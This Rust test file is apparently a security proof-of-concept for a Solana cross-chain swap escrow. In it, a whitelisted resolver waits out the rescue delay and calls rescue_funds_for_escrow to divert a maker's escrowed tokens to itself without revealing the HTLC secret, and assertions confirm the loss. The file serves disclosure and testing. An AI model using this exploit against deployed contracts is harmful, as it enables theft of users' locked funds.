use common::constants::RESCUE_DELAY;
use common_tests::helpers::*;
use common_tests::src_program::{create_order, SrcProgram};
use common_tests::whitelist::prepare_resolvers_src;
use solana_program_test::tokio;
use solana_sdk::signature::Signer;
use test_context::{test_context, AsyncTestContext};

// ============================================================================
// SCENARIO: Resolver steals Maker's Source Chain funds via rescue_funds_for_escrow
// This simulates a Solana -> EVM swap where Solana is the Source Chain.
// The Resolver does not need to interact with the EVM chain to execute this theft.
// ============================================================================
#[test_context(TestStateBase<SrcProgram, TokenSPL>)]
#[tokio::test]
async fn test_attack_resolver_steals_maker_funds(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
    println!("\n=========================================");
    println!("=== SCENARIO: Resolver steals Maker funds via rescue_funds_for_escrow ===");
    println!("=========================================");

    // --- PHASE 1: NORMAL FLOW (Maker creates order on Solana Source Chain) ---
    println!("\n=== DAY 0: Normal Flow - Maker locks funds on Solana (Source) ===");
    
    src_state.test_arguments.asset_is_native = false;
    src_state.test_arguments.order_amount = 100_000_000; // 100 JUP
    src_state.test_arguments.escrow_amount = 100_000_000;
    
    let maker_initial_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
    let attacker_initial_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    // Maker creates order on Source Chain.
    let (_order_a, _order_ata_a) = create_order(src_state).await;

    println!("[CHAIN A - Solana SRC] Maker locked 100 JUP in Order.");
    println!("[BEFORE] Maker JUP balance: {}", maker_initial_jup);
    println!("[BEFORE] Attacker (Resolver) JUP balance: {}", attacker_initial_jup);

    // --- PHASE 2: ATTACKER (RESOLVER) FILLS ORDER ---
    println!("\n=== PHASE 2: Whitelisted Resolver fills Maker's order ===");
    
    // Attacker is a legitimate whitelisted resolver
    prepare_resolvers_src(src_state, &[src_state.taker_wallet.keypair.pubkey()]).await;
    println!("[SETUP] Attacker is a registered Whitelisted Resolver.");

    // Attacker (acting as Taker) fills the order on SRC. 100 JUP moves to escrow_ata.
    let (escrow_a, escrow_ata_a) = create_escrow(src_state).await;
    println!("[CHAIN A - Solana SRC] Attacker filled order. 100 JUP moved to EscrowSrc.");

    // --- PHASE 3: THE EXPLOIT (Timelock Bypass & Fund Theft) ---
    println!("\n=== DAY 8: Attacker exploits rescue_funds_for_escrow ===");
    
    // Fast forward time by 8 days + 100 seconds
    set_time(&mut src_state.context, src_state.init_timestamp + RESCUE_DELAY + 100);

    let attacker_jup_before_rescue = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    // Attacker uses the rescue_funds_for_escrow bug to steal funds WITHOUT the secret
    // The bug in SRC routes the funds to taker_ata (Attacker) and only checks RESCUE_DELAY.
    src_state.test_arguments.rescue_amount = 100_000_000; // Steal all 100 JUP
    let rescue_tx_src = SrcProgram::get_rescue_funds_tx(
        src_state,
        &escrow_a,
        &src_state.token,
        &escrow_ata_a,
        &src_state.taker_wallet.token_account, // Funds routed to attacker (taker)
    );
    src_state.client.process_transaction(rescue_tx_src).await.expect_success();

    let attacker_jup_after_rescue = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    let stolen_jup = attacker_jup_after_rescue - attacker_jup_before_rescue;
    
    println!("[CHAIN A - Solana SRC] Attacker stole {} JUP via rescue_funds_for_escrow WITHOUT REVEALING THE SECRET!", stolen_jup);

    // --- PHASE 4: IMPACT ANALYSIS ---
    println!("\n=========================================");
    println!("=== PROFIT & LOSS ANALYSIS ===");
    println!("=========================================");
    
    let maker_final_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
    let attacker_final_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    println!("[Solana SRC] Maker initial JUP: {}", maker_initial_jup);
    println!("[Solana SRC] Maker final JUP:   {} (LOST FUNDS)", maker_final_jup);
    println!("[Solana SRC] Attacker initial JUP: {}", attacker_initial_jup);
    println!("[Solana SRC] Attacker final JUP:   {} (STOLEN FUNDS)", attacker_final_jup);

    println!("\n[VERDICT] HTLC atomicity is COMPLETELY BROKEN - secret never revealed!");
    println!("[VERDICT] Maker lost funds on Source Chain without receiving anything on Destination Chain.");

    assert!(stolen_jup > 0, "Attacker should have stolen JUP");
    assert!(maker_final_jup < maker_initial_jup, "Maker should have lost JUP");
}
